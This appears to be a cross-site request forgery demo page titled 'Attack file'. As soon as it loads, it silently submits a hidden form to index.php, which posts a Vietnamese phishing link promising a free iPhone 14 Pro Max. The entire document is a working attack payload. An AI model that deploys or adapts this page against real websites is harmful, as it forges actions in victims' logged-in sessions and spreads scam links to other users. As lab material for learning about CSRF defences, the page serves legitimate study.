<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ" crossorigin="anonymous">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <title>Attack file</title>
</head>
<body>
    <div class="container mt-5">
        <form action="index.php" method="post" id="formhack">
            <input type="hidden" name="post-content" id="myInput" value="<a href='attackfile.php'>Bạn đã trúng Iphone 14 Promax. Nhấp vào đây để nhận thưởng</a>">
            <input type="text" name="post_news">
        </form>
    </div>
    <script>
        $(document).ready(function(){
            $('#formhack').submit();
        });
    </script>
</body>
</html>